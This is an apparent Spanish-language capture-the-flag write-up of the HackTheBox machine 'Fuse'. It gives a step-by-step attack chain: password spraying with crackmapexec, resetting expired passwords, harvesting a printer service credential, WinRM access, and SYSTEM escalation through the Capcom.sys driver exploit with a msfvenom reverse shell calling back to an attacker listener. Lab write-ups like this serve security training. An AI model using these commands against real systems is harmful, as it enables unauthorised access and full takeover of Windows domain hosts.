---
layout: post
title: HTB_Fuse
date: 2023/07/10
slug: HTB_Fuse
heroImage: /assets/machines.jpg
---

# Fuse {-}

## Introduccion {-}

La maquina del dia 13/08/2021 se llama Fuse.

El replay del live se puede ver aqui

[![S4vitaar Fuse maquina](https://img.youtube.com/vi/GVOAKYeBv9c/0.jpg)](https://www.youtube.com/watch?v=GVOAKYeBv9c)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.193
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.193
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.193 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49675,49676,49680,49698,49761 10.10.10.193 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                       | Que falta?                |
| ------ | ---------- | ---------------------------------------- | ------------------------- |
| 53     | domain     | Domain controller rpcclient null session |                           |
| 80     | http       | Web, Fuzzing                             |                           |
| 88     | Kerberos   | asproasting attack                       | lista de usuarios validos |
| 135    | msrpc      |                                          |                           |
| 139    | netbios    |                                          |                           |
| 389    | LDAP       | Bloodhound                               | credenciales              |
| 445    | smb        | Null session                             |                           |
| 464    | kpasswd5?  |                                          |                           |
| 593    | ncacn_http |                                          |                           |
| 636    | tcpwrapped |                                          |                           |
| 3268   | ldap       |                                          |                           |
| 3269   | tcpwrapped |                                          |                           |
| 5985   | WinRM      | evil-winrm                               | credenciales              |
| 9389   | mc-nmf     | Puertos por defecto de windows           |                           |
| 49666  | msrpc      | Puertos por defecto de windows           |                           |
| 49667  | msrpc      | Puertos por defecto de windows           |                           |
| 49675  | msrpc      | Puertos por defecto de windows           |                           |
| 49676  | ncacn_http | Puertos por defecto de windows           |                           |
| 49680  | msrpc      | Puertos por defecto de windows           |                           |
| 49698  | msrpc      | Puertos por defecto de windows           |                           |
| 49761  | msrpc      | Puertos por defecto de windows           |                           |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.193
smbclient -L 10.10.10.193 -N
```

Vemos que estamos en frente de una maquina Windows Server 2016 Standard de 64 bit pro que se llama **FUSE** en el dominio **fabricorp.local**.
No vemos ningun recursos compartidos a nivel de red.
Añadimos el dominio a nuestro 
```bash
 /etc/hosts 
```
.

### Buscando ususarios con rpcclient y rpcenum {-}

```bash
rpcclient -U "" 10.10.10.193 -N

rpcclient $> enumdomusers
```

Aqui vemos un Access Denied.

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.193
```

Vemos una vez mas que estamos en frente de una IIS pero nada mas. Seguimos checkeando la web.


#### Checkear la web {-}

Sabemos que es un IIS 10.0 con asp.net. Hay una redireccion automatica a fuzse.fabricorp.local y vemos que estamos en frente
de un servicio de impressora. Miramos los logs print y vemos una columna interesante que es la de **Users**.

Nos creamos un fichero users y copiamos los usuarios de la web.

Ya que tenemos un fichero con contraseñas, intentamos fuerza bruta con **crackmapexec**.


## Vulnerability Assessment {-}

### Crackeo con diccionario {-}

Como tenemos una lista de usuarios potenciales, intentamos combinar los usuarios poniendo como contraseña los mismos usuarios.
Esto se hace con crackmapexec de la siguiente forma.

```bash
crackmapexec smb 10.10.10.193 -u users -p users
```

Esto no nos da nada. Intentamos crear un diccionario con la palabras encontrada en la web con **CEWL**

### Creando un diccionario desde una pagina web con CEWL {-}

```bash
cewl -w passwords http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers
```

Intentamos otravez el crackeo con **crackmapexec**

```bash
crackmapexec smb 10.10.10.193 -u users -p passwords --continue-on-success | grep -v -i "failure"
```

Aqui vemos algo interesante:

````bash
fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
fabricorp.local\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
```

Aqui **crackmapexec** nos dice que a encontrado contraseñas pero son contraseñas por defectos que se tienen que modificar.
Las vamos a cambiar con la utilidad **smbpasswd**

### Cambiando contraseñas con smbpasswd {-}

```bash
smbpasswd -r 10.10.10.193 -U "bhult"
> Old SMB password: Fabricorp01
> New SMB password: S4vitar123$!
> Retype new SMB password: S4vitar123$!

Password changed for user bhult on 10.10.10.193
```

Lo miramos con crackmapexec

```bash
crackmapexec smb 10.10.10.193 -u "bhult" -p 'S4vitar123$!'
```

Ya vemos que hay un *[+]* lo que quiere decir que tenemos credenciales validas.

Intentamos connectarnos con rpcclient

```bash
rpcclient -U 'bhult%S4vitar123$!' 10.10.10.193
```

Nos pone un logon failure. Nos hace pensar que hay como una tarea que cambia la contraseña despues de un momento, intentamos hacer
lo mismo pero un poco mas rapido.

```bash
smbpasswd -r 10.10.10.193 -U "bhult"
> Old SMB password: Fabricorp01
> New SMB password: S4vitar123$!
> Retype new SMB password: S4vitar123$!

Password changed for user bhult on 10.10.10.193

rpcclient -U 'bhult%S4vitar123$!' 10.10.10.193
```

Ya estamos a dentro.

### Enumerando la maquina con rpcclient {-}

```bash
enumdomusers
```

Como hay un printer, tambien se puede enumerar impresoras.

```bash
enumprinters
```

Aqui nos sale una contraseña.

1. Copiamos los usuarios

    ```bash
    echo "user:[Administrator] rid:[0x1f4]
    user:[Guest] rid:[0x1f5]
    user:[krbtgt] rid:[0x1f6]
    user:[DefaultAccount] rid:[0x1f7]
    user:[svc-print] rid:[0x450]
    user:[bnielson] rid:[0x451]
    user:[sthompson] rid:[0x641]
    user:[tlavel] rid:[0x642]
    user:[pmerton] rid:[0x643]
    user:[svc-scan] rid:[0x645]
    user:[bhult] rid:[0x1bbd]
    user:[dandrews] rid:[0x1bbe]
    user:[mberbatow] rid:[0x1db1]
    user:[astein] rid:[0x1db2]
    user:[dmuir] rid:[0x1db3]" | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' > users
    ```

1. Checkeamos con crackmapexec que usuario tiene la contraseña encontrado con enumprinters

    ```bash
    crackmapexec smb 10.10.10.193 -u users -p '$fab@s3Rv1ce$1'
    ```

Aqui vemos que tenemos una credencial valida para el usuario svc-print. Aqui vamos a intentar ganar accesso al systema con WinRM.

## Vuln exploit & Gaining Access {-}

### Ganando accesso con Win-RM {-}

```bash
crackmapexec winrm 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
```

Aqui vemos quel usuario es (Pwn3d!)

```bash
evil-winrm -i 10.10.10.161 -u 'svc-print' -p '$fab@s3Rv1ce$1'
```

ya estamos a dentro de la maquina y podemos ver la flag del usuario.

## Privilege Escalation {-}

### Rootear la maquina {-}

Enumeamos los privilegios del ususarios

```bash
whoami /priv
whoami /all
```

Vemos quel usuario tiene un privilegio **SeLoadDriverPrivilege**. Miramos en la web si se puede escalar privilegios con
esto. 

En firefox buscamos con *SeLoadDriverPrivilege exploit* y caemos en la web de [tarlogic](https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/).

Aqui S4vitar nos recomienda trabajar desde una maquina Windows con Visual studio 19 installado para buildear el exploit.

#### Crando el exploit LoadDriver.exe desde la maquina windows {-}

1. creamos una carpeta de trabajo llamado fuse
1. desde visual studio creamos un nuevo proyecto llamado LoadDriver de typo Console App
1. copiamos el contenido del fichero [eoploaddriver](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp) en el ficher *Source Files/LoadDriver.cpp* del proyecto.
1. eliminamos el primer include que nos da un error *#include "stdafx.h* y que no es necessario
1. en visual studio cambiamos el Debug a Realease y le ponemos x64

1. en el menu le damos a Build -> Rebuild solution
![Fuse-VS2019](/assets/images/Fuse-VS2019.png) 

Esto nos cree un fichero LoadDriver.exe que copiamos en una carpeta compiledbinaries.

#### Recuperamos el capcom.sys {-}

En la web de tarlogic nos dice que necessitamos un fichero llamado *capcom.sys* lo descargamos desde la [web](https://github.com/FuzzySecurity/Capcom-Rootkit/raw/master/Driver/Capcom.sys) y la copiamos
en la carpeta compiledbinaries.

#### Creamos el ExploitCapcom.exe {-}

En este punto nos tenemos que descargar el fichero **ExploitCapcom**. Este fichero se tiene que compilar desde Visual Studio.

1. descargamos el proyecto

    ```bash
    git clone https://github.com/tandasat/ExploitCapcom
    ```

1. desde Visual Studio le damos a File -> Open -> Project/Solution
1. buscamos el .sln y le damos a open

Si abrimos el fichero ExploitCapcom.cpp, la idea aqui seria de modificar el script para que ejecute un binario malicioso creado con *msfvenom*. 
Para esto necesitamos modificar la funccion **launchSell()** del ExploitCapcom.cpp

En la web de [AppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList), buscamos una routa windows interesante donde se puede trabajar
sin problemas, en este caso seria la 
```bash
 C:\Windows\System32\spool\drivers\color 
```


1. Modificamos el script

    ```cpp
    static bool launchSell()
    {
        TCHAR CommandLine[] = TEXT("C:\\Windows\\System32\\spool\\drivers\\color\\reverse.exe");
    }
    ```

1. Buildeamos el proyecto dandole al menu Build -> Rebuild solution
1. copiamos el fichero ExploitCapcom.exe en la carpeta compiledbinaries


#### Passamos los ficheros a la maquina victima {-}

En la carpeta 
```bash
 compiledbinaries 
```
 tenemos nuestros 3 ficheros necesarios para el exploit.
- Capcom.sys
- ExploitCapcom.exe
- LoadDriver.exe

En esta carpeta, montamos un servidor web con python

```bash
python3 -m http.server
```

Desde la maquina de atacante, descargamos estos ficheros

```bash
wget http://192.168.1.14:8000/Capcom.sys
wget http://192.168.1.14:8000/ExploitCapcom.exe
wget http://192.168.1.14:8000/LoadDriver.exe
```

Creamos el reverse.exe con msfvenom

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f exe -o reverse.exe
```

Desde la consola Evil-WinRM de la maquina victima, subimos todo los ficheros

```bash
cd C:\Windows\Temp
upload Capcom.sys
upload ExploitCapcom.exe
upload LoadDriver.exe
cd C:\Windows\System32\spool\drivers\color
upload reverse.exe
```

#### Lanzamos el exploit {-}

En la maquina de atacante nos ponemos en escucha en el puerto 443

```bash
rlwrap nc -nlvp 443
```

En la maquina victima, lanzamos el exploit

```bash
cd C:\Windows\Temp
C:\Windows\Temp\LoadDriver.exe System\CurrentControlSet\savishell C:\Windows\Temp\Capcom.sys
C:\Windows\Temp\ExploitCapcom.exe
```

La reverse shell nos a funccionado y con 
```bash
 whoami 
```
 vemos que ya somos nt authority\system y podemos ver la flag.